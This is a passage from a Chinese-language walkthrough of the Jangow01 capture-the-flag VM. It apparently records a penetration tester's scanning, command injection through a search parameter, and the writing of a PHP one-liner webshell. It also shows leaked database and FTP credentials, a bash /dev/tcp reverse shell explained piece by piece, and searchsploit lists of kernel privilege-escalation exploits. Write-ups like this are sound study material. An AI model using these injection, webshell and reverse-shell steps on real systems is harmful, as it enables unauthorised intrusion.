+</span></span><span style=display:flex><span>+ Apache/2.4.18 appears to be outdated <span style=color:#ff6ac1>(</span>current is at least Apache/2.4.54<span style=color:#ff6ac1>)</span>. Apache 2.2.34 is the EOL <span style=color:#ff6ac1>for</span> the 2.x branch.
+</span></span><span style=display:flex><span>+ /site/: Server may leak inodes via ETags, header found with file /site/, inode: 27ce, size: 5c46fbf4bb499, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name<span style=color:#ff6ac1>=</span>CVE-2003-1418
+</span></span><span style=display:flex><span>+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+</span></span><span style=display:flex><span>+ /site/css/: Directory indexing found.
+</span></span><span style=display:flex><span>+ /site/css/: This might be interesting.
+</span></span><span style=display:flex><span>+ <span style=color:#ff9f43>8103</span> requests: <span style=color:#ff9f43>0</span> error<span style=color:#ff6ac1>(</span>s<span style=color:#ff6ac1>)</span> and <span style=color:#ff9f43>7</span> item<span style=color:#ff6ac1>(</span>s<span style=color:#ff6ac1>)</span> reported on remote host
+</span></span><span style=display:flex><span>+ End Time:           2026-01-29 03:39:24 <span style=color:#ff6ac1>(</span>GMT-5<span style=color:#ff6ac1>)</span> <span style=color:#ff6ac1>(</span><span style=color:#ff9f43>11</span> seconds<span style=color:#ff6ac1>)</span>
+</span></span><span style=display:flex><span>---------------------------------------------------------------------------
+</span></span><span style=display:flex><span>+ <span style=color:#ff9f43>1</span> host<span style=color:#ff6ac1>(</span>s<span style=color:#ff6ac1>)</span> tested</span></span></code></pre></div><h3 id=目录扫描dirb>目录扫描dirb<a class=anchor href=#%e7%9b%ae%e5%bd%95%e6%89%ab%e6%8f%8fdirb>#</a></h3><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span>┌──<span style=color:#ff6ac1>(</span>kali㉿kali<span style=color:#ff6ac1>)</span>-<span style=color:#ff6ac1>[</span>~<span style=color:#ff6ac1>]</span>
+</span></span><span style=display:flex><span>└─$ dirb http://192.168.203.136
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>-----------------
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                             GENERATED WORDS: <span style=color:#ff9f43>4612</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>---- Scanning URL: http://192.168.203.136/ ----
+</span></span><span style=display:flex><span>                                                                             + http://192.168.203.136/server-status <span style=color:#ff6ac1>(</span>CODE:403|SIZE:280<span style=color:#ff6ac1>)</span>                  
+</span></span><span style=display:flex><span>                                                                             <span style=color:#ff6ac1>==</span>&gt; DIRECTORY: http://192.168.203.136/site/
+</span></span><span style=display:flex><span>                                                                            
+</span></span><span style=display:flex><span>---- Entering directory: http://192.168.203.136/site/ ----
+</span></span><span style=display:flex><span>                                                                                                                                                          <span style=color:#ff6ac1>==</span>&gt; DIRECTORY: http://192.168.203.136/site/assets/
+</span></span><span style=display:flex><span>                                                                             <span style=color:#ff6ac1>==</span>&gt; DIRECTORY: http://192.168.203.136/site/css/
+</span></span><span style=display:flex><span>+ http://192.168.203.136/site/index.html <span style=color:#ff6ac1>(</span>CODE:200|SIZE:10190<span style=color:#ff6ac1>)</span>              
+</span></span><span style=display:flex><span>                                                                             <span style=color:#ff6ac1>==</span>&gt; DIRECTORY: http://192.168.203.136/site/js/
+</span></span><span style=display:flex><span>                                                                             <span style=color:#ff6ac1>==</span>&gt; DIRECTORY: http://192.168.203.136/site/wordpress/
+</span></span><span style=display:flex><span>                                                                            
+</span></span><span style=display:flex><span>---- Entering directory: http://192.168.203.136/site/assets/ ----
+</span></span><span style=display:flex><span>                                                                             <span style=color:#ff6ac1>(</span>!<span style=color:#ff6ac1>)</span> WARNING: Directory IS LISTABLE. No need to scan it.
+</span></span><span style=display:flex><span>    <span style=color:#ff6ac1>(</span>Use mode <span style=color:#5af78e>&#39;-w&#39;</span> <span style=color:#ff6ac1>if</span> you want to scan it anyway<span style=color:#ff6ac1>)</span>
+</span></span><span style=display:flex><span>                                                                            
+</span></span><span style=display:flex><span>---- Entering directory: http://192.168.203.136/site/css/ ----
+</span></span><span style=display:flex><span>                                                                             <span style=color:#ff6ac1>(</span>!<span style=color:#ff6ac1>)</span> WARNING: Directory IS LISTABLE. No need to scan it.
+</span></span><span style=display:flex><span>    <span style=color:#ff6ac1>(</span>Use mode <span style=color:#5af78e>&#39;-w&#39;</span> <span style=color:#ff6ac1>if</span> you want to scan it anyway<span style=color:#ff6ac1>)</span>
+</span></span><span style=display:flex><span>                                                                            
+</span></span><span style=display:flex><span>---- Entering directory: http://192.168.203.136/site/js/ ----
+</span></span><span style=display:flex><span>                                                                             <span style=color:#ff6ac1>(</span>!<span style=color:#ff6ac1>)</span> WARNING: Directory IS LISTABLE. No need to scan it.
+</span></span><span style=display:flex><span>    <span style=color:#ff6ac1>(</span>Use mode <span style=color:#5af78e>&#39;-w&#39;</span> <span style=color:#ff6ac1>if</span> you want to scan it anyway<span style=color:#ff6ac1>)</span>
+</span></span><span style=display:flex><span>                                                                            
+</span></span><span style=display:flex><span>---- Entering directory: http://192.168.203.136/site/wordpress/ ----
+</span></span><span style=display:flex><span>                                                                             + http://192.168.203.136/site/wordpress/index.html <span style=color:#ff6ac1>(</span>CODE:200|SIZE:10190<span style=color:#ff6ac1>)</span>    
+</span></span><span style=display:flex><span>                                                                               
+</span></span><span style=display:flex><span>-----------------
+</span></span><span style=display:flex><span>END_TIME: Wed Jan <span style=color:#ff9f43>28</span> 06:16:22 <span style=color:#ff9f43>2026</span>
+</span></span><span style=display:flex><span>DOWNLOADED: <span style=color:#ff9f43>13836</span> - FOUND: <span style=color:#ff9f43>3</span></span></span></code></pre></div><p>能点的都看看，也没发现特殊的内容，有wordpress目录，访问后，返回的不是典型的wordpress站点，因此用wpscan确认</p><h3 id=wpscan>wpscan<a class=anchor href=#wpscan>#</a></h3><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span>┌──<span style=color:#ff6ac1>(</span>kali㉿kali<span style=color:#ff6ac1>)</span>-<span style=color:#ff6ac1>[</span>~<span style=color:#ff6ac1>]</span>
+</span></span><span style=display:flex><span>└─$ wpscan --url http://192.168.203.136/site/wordpress -e u,p
+</span></span><span style=display:flex><span>_______________________________________________________________
+</span></span><span style=display:flex><span>         __          _______   _____
+</span></span><span style=display:flex><span>         <span style=color:#5af78e>\ \ </span>       / /  __ <span style=color:#5af78e>\ </span>/ ____|
+</span></span><span style=display:flex><span>          <span style=color:#5af78e>\ \ </span> /<span style=color:#5af78e>\ </span> / /| |__<span style=color:#ff6ac1>)</span> | <span style=color:#ff6ac1>(</span>___   ___  __ _ _ __ ®
+</span></span><span style=display:flex><span>           <span style=color:#5af78e>\ \/</span>  <span style=color:#5af78e>\/</span> / |  ___/ <span style=color:#5af78e>\_</span>__ <span style=color:#5af78e>\ </span>/ __|/ _<span style=color:#5af78e>`</span> | <span style=color:#ff5c57>&#39;</span>_ <span style=color:#5af78e>\
+</span></span></span><span style=display:flex><span>            <span style=color:#5af78e>\ </span> /<span style=color:#5af78e>\ </span> /  | |     ____<span style=color:#ff6ac1>)</span> | <span style=color:#ff6ac1>(</span>__| <span style=color:#ff6ac1>(</span>_| | | | |
+</span></span><span style=display:flex><span>             <span style=color:#5af78e>\/</span>  <span style=color:#5af78e>\/</span>   |_|    |_____/ <span style=color:#5af78e>\_</span>__|<span style=color:#5af78e>\_</span>_,_|_| |_|
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>         WordPress Security Scanner by the WPScan Team
+</span></span><span style=display:flex><span>                         Version 3.8.28
+</span></span><span style=display:flex><span>       Sponsored by Automattic - https://automattic.com/
+</span></span><span style=display:flex><span>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+</span></span><span style=display:flex><span>_______________________________________________________________
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Scan Aborted: The remote website is up, but does not seem to be running WordPress.</span></span></code></pre></div><p>结果表明靶机没用运行wordpress，只是普通的目录</p><h3 id=gobuster>gobuster<a class=anchor href=#gobuster>#</a></h3><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span>┌──<span style=color:#ff6ac1>(</span>kali㉿kali<span style=color:#ff6ac1>)</span>-<span style=color:#ff6ac1>[</span>~<span style=color:#ff6ac1>]</span>
+</span></span><span style=display:flex><span>└─$ gobuster dir -u http://192.168.203.136 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.js,.sh,.txt
+</span></span><span style=display:flex><span><span style=color:#ff6ac1>===============================================================</span>
+</span></span><span style=display:flex><span>Gobuster v3.8
+</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#ff6ac1>(</span>@TheColonial<span style=color:#ff6ac1>)</span> &amp; Christian Mehlmauer <span style=color:#ff6ac1>(</span>@firefart<span style=color:#ff6ac1>)</span>
+</span></span><span style=display:flex><span><span style=color:#ff6ac1>===============================================================</span>
+</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Url:                     http://192.168.203.136
+</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Method:                  GET
+</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Threads:                 <span style=color:#ff9f43>10</span>
+</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Negative Status codes:   <span style=color:#ff9f43>404</span>
+</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> User Agent:              gobuster/3.8
+</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Extensions:              txt,php,html,js,sh
+</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Timeout:                 <span style=color:#ff5c57>10s</span>
+</span></span><span style=display:flex><span><span style=color:#ff6ac1>===============================================================</span>
+</span></span><span style=display:flex><span>Starting gobuster in directory enumeration <span style=color:#ff5c57>mode</span>
+</span></span><span style=display:flex><span><span style=color:#ff6ac1>===============================================================</span>
+</span></span><span style=display:flex><span>/site                 <span style=color:#ff6ac1>(</span>Status: 301<span style=color:#ff6ac1>)</span> <span style=color:#ff6ac1>[</span>Size: 317<span style=color:#ff6ac1>]</span> <span style=color:#ff6ac1>[</span>--&gt; http://192.168.203.136/site/<span style=color:#ff6ac1>]</span>                                                                        
+</span></span><span style=display:flex><span>/server-status        <span style=color:#ff6ac1>(</span>Status: 403<span style=color:#ff6ac1>)</span> <span style=color:#ff6ac1>[</span>Size: 280<span style=color:#ff6ac1>]</span>
+</span></span><span style=display:flex><span>Progress: <span style=color:#ff9f43>1323348</span> / <span style=color:#ff9f43>1323348</span> <span style=color:#ff6ac1>(</span>100.00%<span style=color:#ff6ac1>)</span>
+</span></span><span style=display:flex><span><span style=color:#ff6ac1>===============================================================</span>
+</span></span><span style=display:flex><span><span style=color:#ff5c57>Finished</span>
+</span></span><span style=display:flex><span><span style=color:#ff6ac1>===============================================================</span></span></span></code></pre></div><p>也没有有价值的信息</p><h3 id=网页url>网页URL<a class=anchor href=#%e7%bd%91%e9%a1%b5url>#</a></h3><p>点击buscar后，提示：<code>http://192.168.203.136/site/busque.php?buscar=</code>，可能是本地包含漏洞、命令执行？
+本地包含漏洞检测：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span>┌──<span style=color:#ff6ac1>(</span>kali㉿kali<span style=color:#ff6ac1>)</span>-<span style=color:#ff6ac1>[</span>~<span style=color:#ff6ac1>]</span>
+</span></span><span style=display:flex><span>└─$ curl http://192.168.203.136/site/busque.php?buscar<span style=color:#ff6ac1>=</span>../../../../../../etc/passwd</span></span></code></pre></div><p>没有返回内容</p><p>命令执行检测：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span>┌──<span style=color:#ff6ac1>(</span>kali㉿kali<span style=color:#ff6ac1>)</span>-<span style=color:#ff6ac1>[</span>~<span style=color:#ff6ac1>]</span>
+</span></span><span style=display:flex><span>└─$ curl http://192.168.203.136/site/busque.php?buscar<span style=color:#ff6ac1>=</span>id
+</span></span><span style=display:flex><span><span style=color:#ff5c57>uid</span><span style=color:#ff6ac1>=</span>33<span style=color:#ff6ac1>(</span>www-data<span style=color:#ff6ac1>)</span> <span style=color:#ff5c57>gid</span><span style=color:#ff6ac1>=</span>33<span style=color:#ff6ac1>(</span>www-data<span style=color:#ff6ac1>)</span> <span style=color:#ff5c57>groups</span><span style=color:#ff6ac1>=</span>33<span style=color:#ff6ac1>(</span>www-data<span style=color:#ff6ac1>)</span></span></span></code></pre></div><p>结果把传的id带回来了，说明没有对传入参数进行限制，因此这里试试传一句话木马
 <code>http://192.168.203.136/site/busque.php?buscar=echo%20%27%3C?php%20evla($_POST[%22cmd%22])%20?%3E%27%20%3E%20shell.php</code>
 接着ls查看是否成功传入<code>shell.php</code>
 <code>http://192.168.203.136/site/busque.php?buscar=ls</code>
-接着用蚁剑连接，连接成功，开始翻垃圾</p>
-<p><code>/var/www/html/site/wordpress/config.php</code>中找到神秘内容</p>
-<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#ff5c57">$servername</span> <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;localhost&#34;</span>;
-</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$database</span> <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;desafio02&#34;</span>;
-</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$username</span> <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;desafio02&#34;</span>;
-</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$password</span> <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;abygurl69&#34;</span>;</span></span></code></pre></div><p><code>/var/www/html/.backup</code>中同样神秘内容</p>
-<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#ff5c57">$servername</span> <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;localhost&#34;</span>;
-</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$database</span> <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;jangow01&#34;</span>;
-</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$username</span> <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;jangow01&#34;</span>;
-</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$password</span> <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;abygurl69&#34;</span>;</span></span></code></pre></div><p><strong>再回过头看</strong>，nmap扫描，有21、80端口，接着目录扫描没找到什么，接着通过蚁剑找到两套php，因此这里试一下21端口。
-使用<code>.backup</code>中账户密码，登场登录</p>
-<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>┌──<span style="color:#ff6ac1">(</span>kali㉿kali<span style="color:#ff6ac1">)</span>-<span style="color:#ff6ac1">[</span>~<span style="color:#ff6ac1">]</span>
-</span></span><span style="display:flex;"><span>└─$ ftp 192.168.203.136
-</span></span><span style="display:flex;"><span>Connected to 192.168.203.136.
-</span></span><span style="display:flex;"><span><span style="color:#ff9f43">220</span> <span style="color:#ff6ac1">(</span>vsFTPd 3.0.3<span style="color:#ff6ac1">)</span>
-</span></span><span style="display:flex;"><span>Name <span style="color:#ff6ac1">(</span>192.168.203.136:kali<span style="color:#ff6ac1">)</span>: jangow01
-</span></span><span style="display:flex;"><span><span style="color:#ff9f43">331</span> Please specify the password.
-</span></span><span style="display:flex;"><span>Password: 
-</span></span><span style="display:flex;"><span><span style="color:#ff9f43">230</span> Login successful.
-</span></span><span style="display:flex;"><span>Remote system <span style="color:#ff5c57">type</span> is UNIX.
-</span></span><span style="display:flex;"><span>Using binary mode to transfer files.
-</span></span><span style="display:flex;"><span>ftp&gt; </span></span></code></pre></div><h2 id="六反弹shell">六、反弹shell<a class="anchor" href="#%e5%85%ad%e5%8f%8d%e5%bc%b9shell">#</a></h2>
-<p>kali中开启监听，用443端口，因为靶机只能用443（不理解）
-<code>nc -lvvp 443</code></p>
-<p>接着去蚁剑打开靶机终端
-<code>bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.203.129/443 0&gt;&amp;1'</code></p>
-<ul>
-<li><code>bash -c</code>告诉bash解释器执行后面引号里的字符串命令</li>
-<li><code>bash -i</code>启动一个交互式的bash窗口</li>
-<li><code>&gt;&amp;</code>是重定向组合符，将标准输出和标准错误都发送到同一个地方</li>
-<li><code>/dev/tcp/192.168.203.129/443</code>不代表硬盘上的文件，而是尝试与ip为<code>192.168.203.129</code>的443端口建立一个tcp网络连接</li>
-<li><code>0&gt;&amp;1</code>是双向绑定，<code>0</code>代表标准输入，<code>1</code>代表标准输出，将我的输入也绑定到网络连接上，这样从kali发送的指令，目标机能接收并执行</li>
-<li>注（这里的ip地址是kali的地址，蚁剑进入的是靶机的端口，反弹shell）</li>
-</ul>
-<p>成功反弹shell</p>
-<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>┌──<span style="color:#ff6ac1">(</span>kali㉿kali<span style="color:#ff6ac1">)</span>-<span style="color:#ff6ac1">[</span>~<span style="color:#ff6ac1">]</span>
-</span></span><span style="display:flex;"><span>└─$ nc -lvvp <span style="color:#ff9f43">443</span>
-</span></span><span style="display:flex;"><span>listening on <span style="color:#ff6ac1">[</span>any<span style="color:#ff6ac1">]</span> <span style="color:#ff9f43">443</span> ...
-</span></span><span style="display:flex;"><span>192.168.203.136: inverse host lookup failed: Unknown host
-</span></span><span style="display:flex;"><span>connect to <span style="color:#ff6ac1">[</span>192.168.203.129<span style="color:#ff6ac1">]</span> from <span style="color:#ff6ac1">(</span>UNKNOWN<span style="color:#ff6ac1">)</span> <span style="color:#ff6ac1">[</span>192.168.203.136<span style="color:#ff6ac1">]</span> <span style="color:#ff9f43">52824</span>
-</span></span><span style="display:flex;"><span>bash: cannot <span style="color:#ff5c57">set</span> terminal process group <span style="color:#ff6ac1">(</span>3862<span style="color:#ff6ac1">)</span>: Inappropriate ioctl <span style="color:#ff6ac1">for</span> device
-</span></span><span style="display:flex;"><span>bash: no job control in this shell
-</span></span><span style="display:flex;"><span>www-data@jangow01:/var/www/html/site$ </span></span></code></pre></div><h2 id="七提权">七、提权<a class="anchor" href="#%e4%b8%83%e6%8f%90%e6%9d%83">#</a></h2>
-<p>当前权限为www-data权限，需要提权
-先查看内核版本和发行版本</p>
-<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>www-data@jangow01:/var/www/html/site$ uname -a
-</span></span><span style="display:flex;"><span>uname -a
-</span></span><span style="display:flex;"><span>Linux jangow01 4.4.0-31-generic <span style="color:#78787e">#50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span>
-</span></span><span style="display:flex;"><span>www-data@jangow01:/var/www/html/site$ lsb_release -a
-</span></span><span style="display:flex;"><span>lsb_release -a
-</span></span><span style="display:flex;"><span>No LSB modules are available.
-</span></span><span style="display:flex;"><span>Distributor ID: Ubuntu
-</span></span><span style="display:flex;"><span>Description:    Ubuntu 16.04.1 LTS
-</span></span><span style="display:flex;"><span>Release:        16.04
-</span></span><span style="display:flex;"><span>Codename:       xenial</span></span></code></pre></div><p>接着进行searchsploit搜索漏洞：</p>
-<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>┌──<span style="color:#ff6ac1">(</span>kali㉿kali<span style="color:#ff6ac1">)</span>-<span style="color:#ff6ac1">[</span>~<span style="color:#ff6ac1">]</span>
-</span></span><span style="display:flex;"><span>└─$ searchsploit ubuntu 4.4.0-31 --overflow
-</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-</span></span><span style="display:flex;"><span> Exploit Title                                                                                                          |  Path
-</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-</span></span><span style="display:flex;"><span>Linux Kernel 4.10.5 / &lt; 4.14.3 <span style="color:#ff6ac1">(</span>Ubuntu<span style="color:#ff6ac1">)</span> - DCCP Socket Use-After-Free                                                    | linux/dos/43234.c
-</span></span><span style="display:flex;"><span>Linux Kernel 4.4.0-21 &lt; 4.4.0-51 <span style="color:#ff6ac1">(</span>Ubuntu 14.04/16.04 x64<span style="color:#ff6ac1">)</span> - <span style="color:#5af78e">&#39;AF_PACKET&#39;</span> Race Condition Privilege Escalation             | windows_x86-64/local/47170.c
-</span></span><span style="display:flex;"><span>Linux Kernel &lt; 4.13.9 <span style="color:#ff6ac1">(</span>Ubuntu 16.04 / Fedora 27<span style="color:#ff6ac1">)</span> - Local Privilege Escalation                                           | linux/local/45010.c
-</span></span><span style="display:flex;"><span>Linux Kernel &lt; 4.4.0-116 <span style="color:#ff6ac1">(</span>Ubuntu 16.04.4<span style="color:#ff6ac1">)</span> - Local Privilege Escalation                                                  | linux/local/44298.c
-</span></span><span style="display:flex;"><span>Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 <span style="color:#ff6ac1">(</span>Ubuntu 14.04/16.04<span style="color:#ff6ac1">)</span> - Local Privilege Escalation <span style="color:#ff6ac1">(</span>KASLR / SMEP<span style="color:#ff6ac1">)</span>                   | linux/local/43418.c
-</span></span><span style="display:flex;"><span>Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 <span style="color:#ff6ac1">(</span>Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin<span style="color:#ff6ac1">)</span> - Local Privilege Escalation <span style="color:#ff6ac1">(</span>KASLR / SMEP<span style="color:#ff6ac1">)</span> | linux/local/47169.c
-</span></span><span style="display:flex;"><span>Ubuntu &lt; 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation                                  | linux/local/41760.txt
-</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-</span></span><span style="display:flex;"><span>Shellcodes: No Results
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>┌──<span style="color:#ff6ac1">(</span>kali㉿kali<span style="color:#ff6ac1">)</span>-<span style="color:#ff6ac1">[</span>~<span style="color:#ff6ac1">]</span>
-</span></span><span style="display:flex;"><span>└─$ searchsploit ubuntu 16.04 --overflow
-</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-</span></span><span style="display:flex;"><span> Exploit Title                                                                                                          |  Path
-</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-</span></span><span style="display:flex;"><span>Apport 2.x <span style="color:#ff6ac1">(</span>Ubuntu Desktop 12.10 &lt; 16.04<span style="color:#ff6ac1">)</span> - Local Code Execution                                                        | linux/local/40937.txt
-</span></span><span style="display:flex;"><span>Exim <span style="color:#ff9f43">4</span> <span style="color:#ff6ac1">(</span>Debian <span style="color:#ff9f43">8</span> / Ubuntu 16.04<span style="color:#ff6ac1">)</span> - Spool Privilege Escalation                                                           | linux/local/40054.c
-</span></span><span style="display:flex;"><span>Google Chrome <span style="color:#ff6ac1">(</span>Fedora <span style="color:#ff9f43">25</span> / Ubuntu 16.04<span style="color:#ff6ac1">)</span> - <span style="color:#5af78e">&#39;tracker-extract&#39;</span> / <span style="color:#5af78e">&#39;gnome-video-thumbnailer&#39;</span> + <span style="color:#5af78e">&#39;totem&#39;</span> Drive-By Download    | linux/local/40943.txt
-</span></span><span style="display:flex;"><span>LightDM <span style="color:#ff6ac1">(</span>Ubuntu 16.04/16.10<span style="color:#ff6ac1">)</span> - <span style="color:#5af78e">&#39;Guest Account&#39;</span> Local Privilege Escalation                                               | linux/local/41923.txt
-</span></span><span style="display:flex;"><span>Linux Kernel <span style="color:#ff6ac1">(</span>Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / CentOS 7.3.1611<span style="color:#ff6ac1">)</span> - <span style="color:#5af78e">&#39;ldso_hwcap_64 Stack Clash&#39;</span> Local Privilege Escalation | linux_x86-64/local/42275.c
-</span></span><span style="display:flex;"><span>Linux Kernel <span style="color:#ff6ac1">(</span>Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25<span style="color:#ff6ac1">)</span> - <span style="color:#5af78e">&#39;ldso_dynamic Stack Clash&#39;</span> Local Privilege Escalation | linux_x86/local/42276.c
-</span></span><span style="display:flex;"><span>Linux Kernel <span style="color:#ff6ac1">(</span>Ubuntu 16.04<span style="color:#ff6ac1">)</span> - Reference Count Overflow Using BPF Maps                                                   | linux/dos/39773.txt
-</span></span><span style="display:flex;"><span>Linux Kernel 4.14.7 <span style="color:#ff6ac1">(</span>Ubuntu 16.04 / CentOS 7<span style="color:#ff6ac1">)</span> - <span style="color:#ff6ac1">(</span>KASLR &amp; SMEP Bypass<span style="color:#ff6ac1">)</span> Arbitrary File Read                               | linux/local/45175.c
-</span></span><span style="display:flex;"><span>Linux Kernel 4.4 <span style="color:#ff6ac1">(</span>Ubuntu 16.04<span style="color:#ff6ac1">)</span> - <span style="color:#5af78e">&#39;BPF&#39;</span> Local Privilege Escalation <span style="color:#ff6ac1">(</span>Metasploit<span style="color:#ff6ac1">)</span>                                         | linux/local/40759.rb
-</span></span><span style="display:flex;"><span>Linux Kernel 4.4 <span style="color:#ff6ac1">(</span>Ubuntu 16.04<span style="color:#ff6ac1">)</span> - <span style="color:#5af78e">&#39;snd_timer_user_ccallback()&#39;</span> Kernel Pointer Leak                                      | linux/dos/46529.c
-</span></span><span style="display:flex;"><span>Linux Kernel 4.4.0 <span style="color:#ff6ac1">(</span>Ubuntu 14.04/16.04 x86-64<span style="color:#ff6ac1">)</span> - <span style="color:#5af78e">&#39;AF_PACKET&#39;</span> Race Condition Privilege Escalation                        | linux_x86-64/local/40871.c
-</span></span><span style="display:flex;"><span>Linux Kernel 4.4.0-21 <span style="color:#ff6ac1">(</span>Ubuntu 16.04 x64<span style="color:#ff6ac1">)</span> - Netfilter <span style="color:#5af78e">&#39;target_offset&#39;</span> Out-of-Bounds Privilege Escalation                 | linux_x86-64/local/40049.c
-</span></span><span style="display:flex;"><span>Linux Kernel 4.4.0-21 &lt; 4.4.0-51 <span style="color:#ff6ac1">(</span>Ubuntu 14.04/16.04 x64<span style="color:#ff6ac1">)</span> - <span style="color:#5af78e">&#39;AF_PACKET&#39;</span> Race Condition Privilege Escalation             | windows_x86-64/local/47170.c
-</span></span><span style="display:flex;"><span>Linux Kernel 4.4.x <span style="color:#ff6ac1">(</span>Ubuntu 16.04<span style="color:#ff6ac1">)</span> - <span style="color:#5af78e">&#39;double-fdput()&#39;</span> bpf<span style="color:#ff6ac1">(</span>BPF_PROG_LOAD<span style="color:#ff6ac1">)</span> Privilege Escalation                            | linux/local/39772.txt
-</span></span><span style="display:flex;"><span>Linux Kernel 4.6.2 <span style="color:#ff6ac1">(</span>Ubuntu 16.04.1<span style="color:#ff6ac1">)</span> - <span style="color:#5af78e">&#39;IP6T_SO_SET_REPLACE&#39;</span> Local Privilege Escalation                                  | linux/local/40489.txt
-</span></span><span style="display:flex;"><span>Linux Kernel 4.8 <span style="color:#ff6ac1">(</span>Ubuntu 16.04<span style="color:#ff6ac1">)</span> - Leak sctp Kernel Pointer                                                              | linux/dos/45919.c
-</span></span><span style="display:flex;"><span>Linux Kernel &lt; 4.13.9 <span style="color:#ff6ac1">(</span>Ubuntu 16.04 / Fedora 27<span style="color:#ff6ac1">)</span> - Local Privilege Escalation                                           | linux/local/45010.c
